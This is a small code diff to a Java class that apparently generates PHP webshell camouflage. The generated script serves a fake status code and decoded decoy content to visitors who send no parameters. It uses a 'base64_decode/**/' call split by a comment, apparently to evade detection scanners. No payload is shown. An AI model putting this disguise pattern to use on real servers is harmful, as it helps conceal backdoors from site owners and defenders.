@@ -117,6 +117,7 @@ public class HtmlPretend {
                 "if( count($_REQUEST) || file_get_contents(\"php://input\") ){\r\n" +
                 "\r\n"+
                 "}else{\r\n" +
+                "    header('Content-Type:text/html;charset=utf-8');"+
                 "    http_response_code("+code+");\r\n" +
                 "    echo base64_decode/**/($"+this.key+");\r\n" +
                 "}";
